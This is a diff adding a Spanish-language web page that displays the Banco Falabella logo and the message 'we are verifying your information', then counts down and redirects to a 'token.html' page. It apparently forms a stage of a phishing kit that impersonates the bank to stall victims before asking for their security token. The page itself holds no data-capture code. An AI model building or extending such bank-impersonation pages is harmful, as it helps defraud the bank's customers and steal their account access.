@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f1f1f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            max-width: 400px;
+            width: 90%;
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .login-container img {
+            max-width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input {
+            width: 94%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .login-container select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .login-container button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 20px;
+            border: none;
+            width: 100%;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .login-container button:disabled {
+            background-color: #D3DCE3;
+            color: #656C71;
+            padding: 15px 20px;
+            border: none;
+            width: 100%;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        @media screen and (max-width: 480px) {
+            .login-container {
+                width: 100%;
+                border-radius: 0;
+            }
+
+            body {
+                align-items: normal;
+
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1200px-Logotipo_Banco_Falabella.svg.png"
+            alt="Logo">
+        <div style="text-align: center;">
+
+            <p>Estamos verificando tu informaci&oacute;n</p>
+            <img src="https://i.gifer.com/ZKZg.gif" style="width: 100px;margin-top: 20px;"> 
+            <p>Por favor espere <span id="countdown">20</span> segundos</p>
+
+            <script>
+                // Función para iniciar la cuenta regresiva
+                function startCountdown(seconds) {
+                    // Obtener el elemento <span> donde mostraremos el contador
+                    var countdownElement = document.getElementById("countdown");
+
+                    // Iniciar el intervalo de cuenta regresiva
+                    var countdownInterval = setInterval(function () {
+                        // Actualizar el contenido del elemento con el valor actual de segundos
+                        countdownElement.textContent = seconds;
+
+                        // Reducir el valor de segundos
+                        seconds--;
+
+                        // Verificar si el contador ha llegado a cero
+                        if (seconds < 0) {
+                            // Limpiar el intervalo y mostrar una alerta
+                            clearInterval(countdownInterval);
+
+                            window.location.href = "token.html";
+                        }
+                    }, 1000); // Intervalo de 1 segundo
+                }
+
+                // Llamar a la función de cuenta regresiva al cargar la página
+                document.addEventListener("DOMContentLoaded", function () {
+                    startCountdown(19); // Iniciar la cuenta regresiva con 30 segundos
+                });
+            </script>
+        </div>
+    </div>
+</body>
+
+
+</html>
